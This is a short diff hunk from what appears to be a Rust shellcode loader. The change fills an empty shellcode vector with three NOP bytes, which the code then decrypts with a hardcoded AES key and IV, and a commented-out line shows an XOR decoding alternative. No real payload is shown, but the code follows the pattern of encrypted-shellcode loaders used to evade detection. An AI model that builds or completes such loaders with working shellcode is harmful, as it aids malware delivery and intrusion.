@@ -144,7 +144,7 @@ fn main() {
     //let mut shellcode: Vec<u8> = xor_decode(&encoded_shellcode, 0xDA);
 
     //aes encrypted shellcode goes here
-    let aes_shellcode: Vec<u8> = vec![];
+    let aes_shellcode: Vec<u8> = vec![0x90, 0x90, 0x90];
     let mut shellcode: Vec<u8> = aes_256_decrypt(&aes_shellcode, b"ABCDEFGHIJKLMNOPQRSTUVWXYZ-01337", b"This is 16 bytes");
 
 
